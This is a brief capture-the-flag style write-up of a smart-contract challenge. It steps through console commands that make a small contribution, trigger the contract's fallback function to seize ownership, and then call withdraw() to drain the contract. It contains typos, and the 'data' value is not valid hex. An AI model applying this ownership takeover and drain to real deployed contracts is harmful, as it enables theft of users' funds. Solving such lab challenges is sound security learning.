Following the source code above and 
Reading through the instruction provided:

it requires that I make contribution to the Conntract, this was done using 
await contract.contribute({from:player, value: toWei(0.0004)}) 

Checked validity of my contribution using:
await contract.getContribution()


checked ownership using:
contract.owner() of which its returned value is not the saame as player

claiming ownership:
To claim owner ship, I need to interact with the contract's fallback:
sendTransaction({from:player, to:instance, value: toWei(0.0004), data:"0xoeor"}) 

validating ownership:
await contract.owner() returned value is same as player value

Emptying the contract:
await contract.withdraw()
